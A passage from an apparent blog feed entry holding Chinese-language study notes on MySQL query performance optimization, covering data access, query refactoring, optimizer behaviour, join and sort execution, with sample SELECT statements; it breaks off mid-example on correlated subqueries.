      <link href="/2018/10/01/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%9F%A5%E8%AF%A2%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/"/>
      <url>/2018/10/01/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%9F%A5%E8%AF%A2%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>高性能mysql学习笔记-查询性能优化</p><a id="more"></a><h1 id="查询性能优化"><a href="#查询性能优化" class="headerlink" title="查询性能优化"></a>查询性能优化</h1><h2 id="为什么查询速度会变慢"><a href="#为什么查询速度会变慢" class="headerlink" title="为什么查询速度会变慢"></a>为什么查询速度会变慢</h2><ul><li>快速查询取决于响应时间</li><li>如果把查询看成是一个任务，那么它由一系列子任务组成，每个子任务都会消耗一定的时间。如果要优化查询，实际上要优化其子任务，要么消除其中一些子任务，要么减少子任务的执行次数，要么让子任务运行得更快(有时候需要修改一些查询，减少这些查询对系统中运行的其他查询的影响，这时候是在减少一个查询的资源消耗)。</li><li><p>查询的生命周期：</p><ul><li>从客户端</li><li>到服务器</li><li><p>在服务器上：</p><ul><li>解析</li><li>生成执行计划</li><li>执行：最重要的阶段。包括了大量为了检索数据到存储引擎的调用及调用后的数据处理，包括排序，分组等。</li><li>返回结果给客户端</li></ul></li></ul></li><li><p>完成这些任务，需要在不同的地方花费时间。包括网络，CPU计算，生成统计信息和执行计划、锁等待(互斥等待)等操作，尤其是向底层存储引擎检索数据的调用操作，这些调用需要在内存操作、CPU操作和内存不足时导致的IO操作上消耗的时间。根据存储引擎的不同，可能还会产生大量的上下文切换以及系统调用。</p></li></ul><h2 id="慢查询基础：优化数据访问："><a href="#慢查询基础：优化数据访问：" class="headerlink" title="慢查询基础：优化数据访问："></a>慢查询基础：优化数据访问：</h2><p><strong>查询性能低下最根本的原因是访问的数据太多。</strong>某些查询可能不可避免地需要筛选大量数据，但这并不常见。大部分性能低下的查询都可以通过减少访问的数据量进行优化。对于低效的查询，可以通过下面两个步骤分析：</p><ul><li>确认应用程序是否在检索大量超过需要的数据。这通常意味着访问了太多的行，但有时候也可能是访问了太多的列。</li><li>确认MySQL服务器层是否在分析大量超过需要的数据行。</li></ul><h3 id="是否向数据库请求了不需要的数据"><a href="#是否向数据库请求了不需要的数据" class="headerlink" title="是否向数据库请求了不需要的数据"></a>是否向数据库请求了不需要的数据</h3><p>有些查询会请求超过实际需要的数据，然后这些多余的数据会被应用程序丢弃。这会给MySQL服务器带来额外的负担，并增加网络开销，另外也会消耗应用服务器的CPU和内存资源。</p><p>典型案例：</p><ul><li>查询不需要的记录：一个常见错误是误以为MySQL只会返回需要的数据，实际上MySQL确实先返回全部结果集再进行计算。最简单有效的办法是在这样的查询后面加上LIMIT。</li><li>多表关联时返回全部列：正确做法是只取需要的列</li><li><p>总是取出全部的列：</p><ul><li>取出全部的列，会让优化其无法完成覆盖扫描这类优化，还会给服务器带来额外的资源消耗。要慎重。</li><li>但是这可以简化开发，提供相同代码片段的复用性，或者应用程序使用了某种缓存机制等其他有必要取出全部列的因素。如果清楚这么做的性能影响，也是可以考虑的。</li></ul></li><li><p>重复查询相同的数据：建议初次查询的时候将这个数据缓存起来，需要的时候从缓存中取出。</p></li></ul><h3 id="MySQL是否在扫描额外的记录"><a href="#MySQL是否在扫描额外的记录" class="headerlink" title="MySQL是否在扫描额外的记录"></a>MySQL是否在扫描额外的记录</h3><p>对于MySQL，最简单的衡量查询开销的三个指标：响应时间、扫描的行数和返回的行数。没有哪个指标能够完美地衡量查询的开销，但它们大致反映了MySQL在内部执行查询时需要访问多少数据，并可以大概推算出查询运行的时间。这三个指标都会记录到MySQL的慢日志中，检查慢日志记录是找出扫描行数过多的查询的好办法。</p><ul><li><p>响应时间：</p><ul><li>响应时间=服务时间+排队时间。实际上没办法细分，目前还没有办法测量。<ul><li>服务时间：数据库处理这个查询真正花的时间。</li><li>排队时间：服务器因为等待某些资源而没有真正执行查询的时间。</li></ul></li><li>看到一个查询的响应时间的时候，要评估是否合理。概括地说，了解这个查询需要那些索引以及它的执行计划是什么，然后计算大概需要多少个顺序和随机IO，在用其乘以在具体硬件条件下一次IO消耗的时间，最后把这些消耗都加起来得到一个参考值。</li></ul></li><li><p>扫描的行数和返回的行数</p><ul><li>分析查询时，查看该查询扫描的行数是非常有帮助的。在一定程度上能够说明该查询找到需要的数据效率高不高。</li><li>不过这个指标还不够完美，因为并不是所有的行的访问代价都是一样的。</li><li>理想情况下扫描的行数和返回的行数应该是相同的。但实际情况下很少存在，比如关联查询。一般扫描的行数与返回的行数比率通常在1:1和10:1之间。</li></ul></li><li><p>扫描的行数和访问类型</p><ul><li>在评估查询开销的时候，需要考虑从表中找到某一行数据的成本。</li><li><p>访问类型(EXPLAIN语句中的type列，row列显示扫描的行数)：</p><ul><li>ref</li><li>ALL(全表扫描)</li></ul></li><li><p>MySQL应用WHERE条件的方式：</p><ul><li>在索引中使用WHERE条件来过滤不匹配的记录，这是在存储引擎完成的。</li><li>使用覆盖索引扫描(在EXTRA 列中出现了Using index)来返回记录，直接从索引中过滤不需要的记录并返回命中结果。这是在MySQL服务器完成的，但无须再回表查询</li><li>从数据表中返回数据，然后过滤不满足条件的记录(在Extra列中出现Using Where)。这在MySQL服务器层完成，MySQL需要先从数据表读出记录然后过滤。</li></ul></li><li><p>优化技巧：</p><ul><li>使用索引覆盖扫描，把所有需要的列都放到索引中，这样存储引擎无须回表获取对应的行就可以返回结果。</li><li>改变库表结构。例如使用单独的汇总表</li><li>重写这个复杂的查询，让MySQL优化器能够以更优化的方式执行这个查询。</li></ul></li></ul></li></ul><h2 id="重构查询方式"><a href="#重构查询方式" class="headerlink" title="重构查询方式"></a>重构查询方式</h2><h3 id="一个复杂的查询还是多个简单的查询"><a href="#一个复杂的查询还是多个简单的查询" class="headerlink" title="一个复杂的查询还是多个简单的查询"></a>一个复杂的查询还是多个简单的查询</h3><ul><li>MySQL从设计上让连接和断开连接都很轻量级，在返回一个小的查询结果方面很高效。</li><li>MySQL内部每秒能够扫描内存中上百万行数据，相比之下，MySQL响应数据给客户端就慢得多了。</li><li>使用尽可能少的查询，但某些场景下将一个大查询分解为多个小查询是很有必要的。</li></ul><h3 id="切分查询"><a href="#切分查询" class="headerlink" title="切分查询"></a>切分查询</h3><ul><li>有时候需要对一个大查询切分成小查询，每个查询功能完全一样，只完成一小部分，每次只返回一小部分查询结果。</li><li>例如删除旧的数据，切分该查询可以尽可能小地影响性能，还可以减少MySQL复制的延迟。一次删除一万行数据一般来说是一个比较高效而且对服务器影响也最小的做法，如果是事务型引擎，很多时候小事务能够更高效。另外，每次删除后都暂停一会，能够将一次性的压力分散到一个很长的时间段中，就可以大大降低对服务器的影响，还可以大大减少删除时锁的持有时间。</li></ul><h3 id="分解关联查询"><a href="#分解关联查询" class="headerlink" title="分解关联查询"></a>分解关联查询</h3><p><strong>很多高性能的应用都会对关联查询进行分解。简单地，可以对每一个表进行一次单表查询，然后将结果在应用程序中进行管理</strong></p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM tag</span><br><span class="line">JOIN tag_post ON tag_post.tag_id=tag.id    </span><br><span class="line">JOIN post ON tag_post.post_id=post.idWHERE tag.tag=<span class="string">'mysql'</span>;</span><br><span class="line">-- 可以分解成：</span><br><span class="line">SELECT * FROM tag WHERE tag=<span class="string">'mysql'</span>;</span><br><span class="line">SELECT * FROM tag_post <span class="built_in">where</span> tag_id=1234;</span><br><span class="line">SELECT * FROM post whre post.id <span class="keyword">in</span> (123, 456);</span><br></pre></td></tr></table></figure><ul><li><p>优势：</p><ul><li>让缓存效率更高。许多应用程序可以方便地缓存单表查询时对应的结果对象，这样可以减少查询时的条件。而对MySQL的查询缓存来说，如果关联中的某个表发生了变化，那么久无法使用查询缓存了，而拆分后，如果某个表很少改变，那么基于该表的查询就可以重复利用查询缓存结果。</li><li>执行单个查询可以减少锁的竞争。</li><li>在应用层做关联，可以更容易对数据库进行拆分，更容易做到高性能和可扩展。</li><li>查询本身效率也可能会有所提升。例如使用IN()代替关联查询，可以让MySQL按照ID顺序进行查询，这可能比随机的关联要更高效。</li><li>可以减少冗余记录的查询。在应用层做关联查询，意味着对于某条记录应用只需要查询一次，而在数据库中做关联查询，则可能需要重复地访问一部分数据。从这点看，这样的重构还可能会减少网络和内存的消耗。</li><li>更进一步，这样做相当于在应用中实现了哈希关联，而不是使用MySQL的嵌套循环关联。某些场景哈希关联的效率要高得多。</li></ul></li><li><p>通过重构查询将关联放到应用程序中更加高效的场景：</p><ul><li>当应用能够方便地缓存当个查询的结果</li><li>当可以将数据分布到不同的MySQL服务器上</li><li>当能够使用IN()的方式来代替关联查询</li><li>当查询中使用同一个数据表的时候</li></ul></li></ul><h2 id="查询执行的基础"><a href="#查询执行的基础" class="headerlink" title="查询执行的基础"></a>查询执行的基础</h2><pre><code>当向MySQL发送一个请求的时候，MySQL的工作流程：​    </code></pre><p>   <a href="查询基础.png">查询执行路径</a></p><ul><li>客户端发送一条查询给服务器</li><li>服务器先检查查询缓存，如果命中了缓存，则立刻返回存储在缓存中的结果。否则进入下一阶段</li><li>服务器进行SQL解析、预处理，再有优化器生成对应的执行计划。</li><li>MySQL根据优化器生成的执行计划，调用存储引擎的API来执行查询</li><li>将结果返回给客户端</li></ul><h3 id="MySQL客户端-服务器通信协议"><a href="#MySQL客户端-服务器通信协议" class="headerlink" title="MySQL客户端/服务器通信协议"></a>MySQL客户端/服务器通信协议</h3><ul><li><p>客户端与服务器之间的通信协议是”半双工“的，这意味着在任何一个时刻，只能有客户端或服务器的其中一个发送数据。</p><ul><li><p>限制：</p><ul><li>没办法进行流量控制，一旦一端开始发送消息，另一端要接收完整消息才能响应它。</li></ul></li><li>客户端用一个单独的数据包将查询传给服务器。如果查询太大，服务器会根据配置max_allowed_packet拒绝更多数据并抛出相应错误。</li><li>服务器响应给用户的数据通常更多，由多个数据包组成。当服务器开始响应客户端请求时，客户端必须完整地接收整个返回结果。如果只取前面几条结果，或者接收几条结果后就直接断开连接，建议在查询中加上LIMIT限制。</li><li><p>客户端多数连接MySQL的库函数(如Java，Python)都可以获取全部结果集并缓存到内存中，还可以逐行获取需要的数据。默认一般是获得全部结果集并缓存到内存中。</p><ul><li>MySQL通常需要等到所有的数据都已经发送给客户端才能释放这条查询所占用的资源，所以接收全部结果并缓存通过可以减少服务器的压力，让查询早点结束而释放相应资源。</li><li>当使用多数连接MySQL的库函数从MySQL获取数据时，其结果看起来都像是从MySQL服务器获取数据，而实际上都是从这个库函数的缓存获取数据。但是当返回一个很大的结果集时，库函数会很很多时间和内存来存储所有的结果集，如果能够尽早开始处理，就能大大减少内存消耗，这种情况下可以不使用缓存来记录结果而是直接处理。这样做的缺点是，对服务器来说，需要等到查询完成后才能释放资源，因此服务器的资源都是被这个查询占用。</li></ul></li><li><p>查询状态，对一个MySQL连接或者说一个线程，任何时候都有一个状态。最简单办法使用<code>SHOW FULL PROCESSLIST</code>命令查看：</p><ul><li>SLEEP：线程正在等待客户端发送新的请求</li><li>QUERY：线程正在执行查询或者正在将查询结果发送给客户端</li><li>LOCKED：在MySQL服务器层，该线程正在等待表锁。在存储引擎级别实现的锁，例如InnoDB的行锁，并不会体现在线程状态中。对于MyISAM来说这是一个比较典型的状态，在其他没有行锁的引擎中也经常会出现。</li><li>Analyzing and statistics：线程正在收集存储引擎的统计信息，并生成查询的执行计划</li><li>Copying to tmp table [on disk]：线程正在执行操作，并且将其结果集都复制到一个临时表中，这种状态一般要么是在做GROUP BY操作，要么是文件排序操作，或者是UNION操作。如果这个状态后面还有”on disk“标记，那标识MySQL正在将一个临时内存表放到磁盘上。</li><li>Sorting result：线程正在对结果集进行排序。</li><li>Sending data：线程可能在多个状态间传送数据，或者在生成结果集，或者在向客户端返回数据。</li></ul></li></ul><h3 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h3></li><li><p>在解析一个查询语句之前，如果查询缓存是打开的，那么MySQL会优先检查这个查询是否命中查询缓存的数据。</p><ul><li>这个检查是通过一个大小写敏感的哈希查找来实现的。</li><li>查询与缓存中的查询即使只有一个字节不同，那也不会匹配缓存结果，这种情况下查询就会进入下一阶段的处理。</li><li>如果当前的查询恰好命中了查询缓存，那么在返回查询结果之前MySQL会检查一次用户权限。这也不需要解析查询SQL语句的，因为在查询缓存中已经存放了当前查询需要访问的表信息。如果权限没有问题，MySQL会跳过所有其它的阶段，直接从缓存中拿到结果并返回给客户端。<h3 id="查询优化处理"><a href="#查询优化处理" class="headerlink" title="查询优化处理"></a>查询优化处理</h3></li></ul><p>查询的生命周期的下一步是将一个SQL转换成一个执行计划，MySQL再依照这个执行计划和存储引擎进行交互，这包括多个子阶段：解析SQL、预处理、优化SQL执行计划。这个过程中的任何错误(例如语法错误)都可能终止查询，另外在实际执行中，这几部分可能一起执行也可能单独执行。</p></li><li><p>语法解析器和预处理：</p><ul><li><p>流程：</p><ul><li>MySQL通过关键字将SQL进行解析，并生成一颗对应的”解析树“。MySQL解析器将使用MySQL语法规则验证和解析查询。例如：验证是否使用错误的关键词，或者使用关键词的顺序是否正确等，再或者它还会验证引号是否能前后正确匹配。</li><li>预处理器则根据一些MySQL规则进一步检查解析树是否合法，例如，这里将检查数据表和数据列是否存在，还会解析名字和别名，看看它们是否有歧义。</li><li>预处理器会验证权限。这通常很快，除非服务器上有非常多的权限配置。</li></ul></li></ul></li><li><p>查询优化器：</p><ul><li><p>经过语法解析器和预处理后，语法树被认为是合法的，并将由优化器将其转化成执行计划。</p><ul><li>一条查询可以有很多执行方式，最后都返回相同的结果。</li><li>优化器的作用就是找到这其中最好的执行计划。</li></ul></li><li><p>MySQL使用基于成本的优化器，它将尝试预测一个查询使用某种执行计划时的成本，并选择其中成本最小的一个。</p><ul><li>最初，成本的最小单位是随机读取一个4K数据页的成本，后来成本计算公式变得更加复杂，并且引入了一些”因子“来估算这些操作的代价，比如当执行一次WHERE条件比较的成本。</li><li>可以通过<code>SHOW STATUS LIKE &#39;Last_query_cost&#39;;</code>来查询当前会话的当前查询的成本，其值N为MySQL的优化器认为大概需要做N个数据页的随机查找才能完成当前的查询。</li><li>Last_query_cost根据一系列统计信息计算得来：每个表或索引的页面个数、索引的基数(索引中不同值的数量)、索引和数据行的长度、索引的分布情况。优化器在评估成本的时候并不考虑任何层面的缓存，它假设读取任何数据都需要一次磁盘IO。</li></ul></li><li><p>导致MySQL选择错误的执行计划的原因:</p><ul><li>统计信息不准确。MySQL依赖存储引擎提供的统计信息来评估成本，但是有的存储引擎提供的信息可能偏差非常大。例如，InnoDB因为其MVVC的架构，并不能维护一个数据表的行数的精确统计信息。</li><li>执行计划中的成本估算不等同于实际执行的成本。所以即使统计信息精确，优化器给出的执行计划也可能不是最优的。例如有时候某个执行计划虽然需要读取更多的页面，但是它的成本却更小，因为这些页面可能都是顺序读或者这些页面已经在内存中，它的访问成本将很小。</li><li>MySQL的最优可能和你想的最优不一样。你可能希望执行时间尽可能短，但是MySQL只是基于其成本模型选择最优的执行计划，而有些时候这并不是最快的执行方式。所以，这里我们看到根据执行成本来选择执行计划并不是完美的模型。</li><li>MySQL从不考虑其他并发执行的查询，这可能会影响到当前查询的速度。</li><li>MySQL也并不是任何时候都是基于成本的优化。有时也会基于一些固定的规则，例如，如果存在全文搜索的MATCH()子句，则在存在全文索引的时候就使用全文索引，即使有时候使用别的索引和WHERE条件可以远比这种方式要快，MySQL也仍然会使用对应的全文索引。</li><li>MySQL不会考虑不受其控制的操作成本，例如执行存储过程或者用户自定义函数的成本。</li><li>优化器有时候无法去估算所有可能的执行计划，所以它可能错过实际上最优的执行计划。</li></ul></li><li><p>优化策略：</p><ul><li>静态优化：直接对解析树进行分析，并完成优化。例如，优化器可以通过一些简单的代数变换将WHERE条件转换成另一种等价形式。静态优化不依赖于特别的数值，如WHERE条件中带入的一些常数等。静态优化在第一次完成后就一直有效，即使使用不同的参数重复执行查询也不会发生变化。可以认为这是一种”编译时优化“。</li><li>动态优化：与上下文有关，也可能和其他很多因素有关，例如WHER条件中的取值，索引中条目对应的数据行数等。这需要在每次查询的执行时候都重新评估，甚至在其执行过程中也会重新优化，可以认为这是”运行时优化“。</li></ul></li><li><p>MySQL能够处理的优化类型：</p><ul><li>重新定义关联表的顺序：数据表的关联并不总是按照在查询中指定的顺序执行。决定关联的顺序是优化器很重要的一部分功能。</li><li>将外连接转换为内连接：并不是所有的OUTER JOIN语句都必须以外连接的方式执行。例如WHERE条件，库表结构都可能会让外连接等价于一个内连接。</li><li>使用等价变换规则：MySQL使用一些等价变换来简化并规范表达式。它可以合并和减少一些比较，还可以移除一些恒成立和一些恒不成立的判断。</li><li>优化COUNT()、MIN()和MAX()：索引和列是否可为空可以帮助MySQL优化这类表达式。例如，要找到某一列的最小值，只需要查询B-Tree索引最左端的记录，MySQL可以直接获取，并在优化器生成执行计划的时候就可以利用这一点(优化器会将这个表达式作为一个常数对待，在EXPLAIN就可以看到”Select tables optimized away”)。类似的，没有任何WHERE条件的COUNT(*)查询通常也可以使用存储引擎提供的一些优化(MyISAM维护了一个变量来存放数据表的行数)</li><li>预估并转换为常数表达式：MySQL检测到一个表达式可以转换为常数的时候，就会一直把该表达式作为常数进行优化处理。例如：一个用户自定义变量在查询中没有发生变化、数学表达式、某些特定的查询(在索引列上执行MIN，甚至是主键或唯一键查找语句)、通过等式将常数值从一个表传到另一个表(通过WHERE、USING或ON来限制某列取值为常数)。</li><li>覆盖索引扫描：当索引中的列包含所有查询中所有需要的列的时候，MySQL就可以使用索引返回需要的数据，而无须查询对应的数据行。</li><li>子查询优化：在某些情况下可以将子查询转换成一种效率更高的形式，从而减少多个查询多次对数据的访问。</li><li>提前终止查询：当发现已经满足查询的需求，能够立刻终止查询。例如使用了LIMIT子句，或者发现一个不成立的条件(立即返回一个空结果)。当存储引擎需要检索”不同取值“或者判断存在性的时候，例如DISTINCT，NOT EXIST()或者LEFT JOIN类型的查询，MySQL都会使用这类优化。</li><li><p>等值传播：如果两个列的值通过等式关联，那么就可以把其中一个列的WHERE条件传递到另一个列上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      </span><br><span class="line">SELECT film.film_id</span><br><span class="line">FROM sakila.film    </span><br><span class="line">    INNER JOIN sakila.film_actor USING(film_id)</span><br><span class="line">    WHERE film.file_id &gt; 500;</span><br><span class="line">    -- 如果手动通过一些条件来告知优化器这个WHERE条件适用于两个表，在MySQL中反而让查询更难维护。</span><br><span class="line">    ... WHERE film.file_id &gt; 500 AND film_actor.film_id &gt; 500;</span><br></pre></td></tr></table></figure></li><li><p>列表IN()的比较：不同于其它数据库IN()完全等价于多个OR条件语句，MySQL将IN()列表中的数据先进行排序，然后通过二分查找的方式来确定列表的值是否满足条件，前者查询复杂度为O(n)，后者为O(log n)。对于有大量取值的情况，MySQL这种处理速度会更快。</p></li></ul></li></ul></li><li><p>数据和索引的统计信息：</p><ul><li>MySQL架构在服务器层有查询优化器，但却没有保存数据和索引的统计信息。因为统计信息由存储引擎实现，不同的存储引擎可能会存储不同的统计信息。</li><li>MySQL查询优化器在生成查询的执行计划时，需要向存储引擎获取相应的统计信息。存储引擎则提供给优化器对应的统计信息，包括：每个表或索引有多少个页面、每个表的每个索引的基数是多少、数据行和索引的长度、索引的分布信息等。</li></ul></li><li><p>MySQL如何执行关联查询：</p><ul><li><p>MySQL认为任何一个查询都是管理，而不局限于需要两个表的匹配，包括每一个查询，每一个片段(例如子查询，甚至基于单表的SELECT)</p><ul><li>UNION查询的例子：MySQL先将一系列的单个查询结果放到一个临时表中，然后再重新读出临时表数据来完成UNION查询。该读取临时表结果的操作也是关联。</li></ul></li><li><p>MySQL关联执行的策略：对任何关联都执行嵌套循环关联操作，即MySQL先在一个表中循环取出单条数据，然后再嵌套循环到下一个表中寻找新配的行，依次下去，直到找到所有表中匹配的行为止。然后根据各个表匹配的行，返回查询中需要的各个列。MySQL会尝试在最后一个关联表中找到所有匹配的行，如果最后一个关联表无法找到更多的行以后，MySQL返回到上一层关联表，看是否能够找到更多的匹配记录，依此类推迭代执行。</p><ul><li>从本质上来说，所有类型的查询都以同样的方式运行。例如，MySQL在FROM子句中遇到子查询时，先执行子查询并将其结果放到一个临时表(MySQL的临时表是没有任何索引的，UNION查询也一样)，然后将这个临时表当作一个普通表对待。简而言之，所有的查询类型都转换成类似的执行计划(在MySQL5.6和MariaDB有重大改变，两个版本都引入更加复杂的执行计划)</li><li>不过不是所有的查询都可以转换。例如，全外连接就无法通过嵌套循环和回溯的方式完成，这是当发现关联表中没有找到任何匹配行的时候，则可能是因为关联是恰好从一个没有任何匹配的表开始。这大概也是MySQL并不支持全外连接的原因。</li></ul></li></ul></li><li><p>执行计划：</p><ul><li>MySQL生成查询的一颗指令树，然后通过存储引擎执行完成这颗指令树并返回结果，这点和其他生成查询字节码来执行查询的其它关系数据库不同。</li><li>最终的执行计划包含了重构查询的全部信息。可以对查询执行EXPLAIN EXTENDED后再执行SHOW WARNINGS看到重构的查询(和原查询有相同的语义，但是查询语句可能并不完全相同)</li><li>任何多表查询都可以用一棵树来表示，我们可以理解为一颗平衡树，但是MySQL的执行计划是一颗左侧深度优先的树。</li></ul></li><li><p>关联查询优化器：</p><ul><li>MySQL优化器最重要的一部分就是关联查询优化，它决定了多个表关联时的顺序。通常多表关联的时候，可以有多张不同的关联顺序，而关联查询优化器则通过评估不同顺序的成本来选择一个代价最小的关联顺序。</li><li>有的时候，优化器给出的并不是最优的关联顺序，这时可以使用STRAIGHT_JOIN关键字来重写查询，让优化器按照你认为的最优关联顺序执行——绝大多数时候，优化器做出的选择都更为准确。</li><li><p>优化器会尽可能遍历没一个表然后逐个做嵌套循环计算每一颗可能的执行计划的树的成本，最后返回一个最优的执行计划。</p><ul><li>如果有N个表关联，那么需要检查n的阶乘种关联顺序。我们称之为所有可能的执行计划的”搜索空间“。如果搜索空间非常大，当需要关联的表超过optimizer_search_depth的限制，优化器会选择使用”贪婪“搜索的方式查找”最优“的关联方式。</li></ul></li><li>优化器偶尔也会选择一个不是最优的执行计划。</li><li>有时，各个查询的顺序并不能随意安排，这时关联优化器可以根据这些规则大大减少搜索空间，例如，左连接、相关子查询。这是因为后面的表的查询需要依赖于前面表的查询结果，这种依赖关系通常可以帮助优化器大大减少需要扫描的执行计划数量。</li></ul></li><li><p>排序优化</p><ul><li><strong>无论如何排序都是一个成本很高的操作，所以从性能角度考虑，应尽可能避免排序或者尽可能避免对大量数据进行排序。</strong></li><li><p>文件排序：当不能使用索引生成排序结果的时候，MySQL需要自己进行排序，如果数据量小则在内存中进行，如果数据量大则需要使用磁盘。</p><ul><li>如果需要排序的数据量小于”排序缓冲区“，MySQL使用内存进行”快速排序“操作。</li><li>如果内存不够排序，MySQL会先将数据分块，对每个独立的块使用”快速排序“进行排序，并将各个块的排序结果存放在磁盘上，然后将各个排序好的块进行合并，最后返回排序结果。</li></ul></li><li><p>排序算法：</p><ul><li>两次传输排序(旧版本使用)：读取行指针和需要排序的字段，对其进行排序，然后在根据排序结果读取需要的数据行。这需要两次数据传输，即需要从数据表中读取两次数据，第二次读取数据的时候，因为读取顺序列进行排序后的所有记录，这会产生大量的随机IO，所以成本非常高。当使用的是MyISAM表的时候，成本可能会更高，因为MyISAM使用系统调用进行数据读取(非常依赖操作系统对数据的缓存)。不过这样做的优点是：排序的时候存储尽可能少的数据，让”排序缓冲区“中尽可能容纳更多的行数进行排序。</li><li>单次传输排序(后新版本使用)：先读取查询所需要的所有列，然后再根据给定列进行排序，最后直接返回排序结果。有点事只需要一次顺序IO读取所有的数据，而无须任何的随机IO，缺点是如果需要返回的列非常大，会额外占用大量的空间，而这些列对排序操作来说是没有任何作用的。因为单条排序记录很大，所以可能会有更多的排序块需要合并。</li><li>很难说以上两个算法效率更高，当查询需要所有的列的总长度不超过max_lenght_for_sort_data时，MySQL使用“单次传输排序”，可以通过参数选择来影响MySQL排序算法的选择。</li></ul></li><li><p>进行文件排序的时候需要使用的临时存储空间可能会比想象的要大得多。原因在于MySQL排序时，对每一个排序记录都会分配一个足够长的定长空间来存放。</p><ul><li>这个定长空间必须足够长以容纳其中最长的字符串。如果是VARCHAR列则需要分配其完整长度，如果使用UTF-8字符集，则为每个字符预留三个字节。</li></ul></li><li><p>在关联查询的时候排序：</p><ul><li>如果ORDER BY子句中所有列都来自关联的第一个表，那么MySQL在关联处理第一个表的时候进行文件排序。可以在EXPLAIN看到Extra字段有“Using filesort”</li><li>除第一种场景，MySQL都会先将关联的结果放到一个临时表中，然后在所有的关联都结束后，再进行文件排序操作。用EXPLAIN可看到“Using temporary;Using filesort”。如果查询中有LIMIT的话，LIMIT也会在排序之后应用，所以即使需要返回较少的数据，临时表和需要排序的数据仍然非常大。<br>5.6后版本在这里做了些改进：当只需要返回部分排序结果的时候，例如使用了LIMIT子句，MySQL不再对所有的结果进行排序，而是根据实际情况，选择抛弃不满足条件的结果，然后在进行排序。</li></ul></li></ul></li></ul><h3 id="查询执行引擎"><a href="#查询执行引擎" class="headerlink" title="查询执行引擎"></a>查询执行引擎</h3><ul><li><p>在解析和优化阶段，MySQL将生成查询对应的执行计划，MySQL的查询执行引擎则根据这个执行计划来完成整个查询。</p><ul><li>这里的执行计划是一个数据结构，不同于其他关系数据库生成的字节码。</li></ul></li><li><p>查询执行阶段不是那么复杂，MySQL只是简单地根据执行计划给出的指令逐步执行。在根据执行计划逐步执行的过程中，又大量的操作需要调用存储引擎实现的“handle API”接口来完成。</p><ul><li>查询中的每一个表由一个handler实例来标识。实际上，MySQL在优化阶段就为每个表创建了一个handler实例，优化器根据这些实例的接口可以获取表的相关信息。</li><li>存储引擎的接口有着非常丰富的功能，但是底层接口却只有十几个，这些接口相互配合能够完成查询的大部分操作</li></ul></li><li><p>并不是所有的操作都有handler完成。例如，当MySQL需要进行表锁的时候，handler可能会实现自己级别的、更细粒度的锁，如InnoDB就实现了自己的行基本锁，但这并不能代替服务器层的表锁。如果是所有存储共有的特性则由服务器层实现，如时间、日期函数、视图和触发器等。</p></li></ul><h3 id="返回结果给客户端"><a href="#返回结果给客户端" class="headerlink" title="返回结果给客户端"></a>返回结果给客户端</h3><ul><li>查询执行的最后一个阶段。即使查询不需要返回结果集给客户端，MySQL仍然会返回这个查询的一些信息，如该查询影响到的行数。</li><li>如果查询可以被缓存，那么MySQL在该阶段也会将结果放到查询缓存中。</li><li>结果集返回客户端是一个增量、逐步返回的过程。例如，服务器处理完关联操作的最后一个关联表，开始生成第一条结果时，MySQL就可以开始向客户端逐步返回结果。<ul><li>好处：<ul><li>服务器端无须存储太多的结果，也就不会因为要返回太多的结果而消耗太多的内存。</li><li>让客户端第一时间获得返回的结果。可使用SQL_BUFFER_RESULT设置。</li></ul></li><li>结果集中的每一行都会以一个满足MySQL客户端/服务器通信协议的封包发送，再通过TCP协议进行传输，在TCP传输的过程中，可能对MySQL的封包进行缓存然后批量传输。</li></ul></li></ul><h2 id="MySQL查询优化器的局限性"><a href="#MySQL查询优化器的局限性" class="headerlink" title="MySQL查询优化器的局限性"></a>MySQL查询优化器的局限性</h2><p>MySQL的万能“嵌套循环”并不是对每种查询都是最优的，但只对少部分查询不适用，我们往往可以通过改写查询让MySQL高效地完成工作。另外，5.6版本会消除很多原本的限制，让更多的查询能够已尽可能高的效率完成。</p><h3 id="关联子查询"><a href="#关联子查询" class="headerlink" title="关联子查询"></a>关联子查询</h3><p>MySQL的子查询实现得非常糟糕，最糟糕的一类查询是WHERE条件语句中包含IN()的子查询。</p>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">SELECT * FROM sakila.filmWHERE film_id IN(    SELECT film_id FROM sakil.film_actor WHERE actor_id =1 );</span><br><span class="line">-- MySQL对IN()列表中的选项有专门的优化策略，但关联子查询并不是这样的,MySQL会将相关的外层表压到子查询中，它认为这样可以高效地查找到数据行。也就是说，以上查询会被MySQL更改成：</span><br><span class="line">SELECT * FROM sakila.film</span><br><span class="line">WHERE EXISTS( </span><br><span class="line">   SELECT film_id FROM sakil.film_actor WHERE actor_id =1  </span><br><span class="line">  AND film_actor.film_id = film.film_id);</span><br><span class="line">-- 这时子查询需要根据film_id来关联外部表的film，因为需要film_id字段，所以MySQL认为无法先执行这个子查询。通过EXPLIAN可以看到子查询是一个相关子查询(DEPENDENT SUBQUERY)，并且可以看到对film表进行全表扫描，然后根据返回的film_id逐个进行子查询。如果外层是一个很大的表，查询性能会很糟糕。</span><br><span class="line">-- 优化重写方式1：SELECT film.* FROM sakila.film </span><br><span class="line">       INNER JOIN sakil.film_actor USING(film_id) </span><br><span class="line">    WHERE actor_id =1;</span><br><span class="line">   -- 